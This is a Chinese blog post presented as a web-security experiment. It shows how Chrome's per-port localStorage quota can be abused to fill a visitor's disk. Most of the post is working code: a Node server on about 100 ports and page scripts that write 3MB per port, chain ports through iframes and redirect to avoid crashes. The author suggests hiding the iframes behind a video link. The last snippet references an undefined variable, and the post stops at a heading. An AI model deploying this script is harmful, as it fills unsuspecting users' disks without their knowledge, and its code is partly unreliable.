title: 作为一个前端，可以如何机智地弄坏一台电脑？
date: 2015-08-02 19:35:21
tags: Web安全
---
有人说，前端的界限就在浏览器那儿。
无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。 这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。 然而，作为一个前端，我发现是有方式打开次元大门的…
这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。 想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。
起因
故事得从localStorage说起。
html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。 windows下的chrome，localStorage存储于C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。
对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。
那么问题就变成：这样的限制足够保护用户硬盘了吗？
关键
关键的问题在于，这一限制，针对的是一个域名+端口。 也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。
我用node简单地开启了服务器，这时，用户访问http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：
var http = require('http');
var fs = require('fs');

//100个端口
for(var port = 1000; port< 1100; port++){
  http.createServer(function (request, response) {
    //请忽略这种循环读文件的方式，只为了简便
    fs.readFile('./index.html', function(err, content){
      if(err) {
      } else {
        response.writeHead(200, { 'Content-Type' : 'text/html; charset=UTF-8' });
        response.write(content);
        response.end();
      }
    });
  }).listen(port, '127.0.0.1');
}
当然，这个index.html里涉及了localStorage写操作。
var s = "";
//慢慢来，别写太大了，好害怕…
for(var i=0; i< 3 * 1024 * 1024; i++){
  s += "0";
}
localStorage.setItem("testData", s);
我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。
自动遍历
但这种程度还不够。 如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？
iframe是个好的尝试。 只要一打开http://127.0.0.1: 1000，页面的脚步就会创建一个iframe，去请求http://127.0.0.1: 1001，一直循环下去。
var Main = (function(){
  var _key = "testData";
  var _max = 1100; //最大限制
  return {
    init: function(){
      //慢慢来，别写太大了，好害怕…
      var s = "";
      for(var i=0; i< 3 * 1024 * 1024; i++){
        s += "0";
      }
      localStorage.setItem(_key, s);

      var port = parseInt(location.port)+1;
      if(port > _max) return;

      //新添加iframe
      var url = "http://127.0.0.1:" + port;
      var $iframe = document.createElement("iframe");
      $iframe.src = url;
      document.getElementsByTagName("body")[0].appendChild($iframe);
    }
  }
})();
当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…
比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。
然后我就看到请求如潮水渐涨：

但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。
防止浏览器崩溃
C盘还未撑满，同志还需努力。怎么办？
突然想到，到达iframe极限之前，我们可以重定向啊。 每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。
var Main = (function(){
  var _key = "testData";
  var _max = 1200; //最大限制
  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转

  return {
    init: function(){
      //慢慢来，别写太大了，好害怕…
      var s = "";
      for(var i=0; i< 3 * 1024 * 1024; i++){
        s += "0";
      }
      localStorage.setItem(_key, s);

      var port = parseInt(location.port)+1;
      if(port > _max) return;

      if(port % _jumpSpace == 0){
        //每50个，重定向一次
        window.location.href = url;
      }else{
        //新添加iframe
        var $iframe = document.createElement("iframe");
        $iframe.src = url;
        document.getElementsByTagName("body")[0].appendChild($iframe);
      }
    }
  }
})();
事实证明，这种蛮拼的方法的确可行。
至此，只要访问http://127.0.0.1: 1000，就会往Local Storage文件夹里写入近500M无用数据： 
里面的数据是这样的：

继续实验的黑科技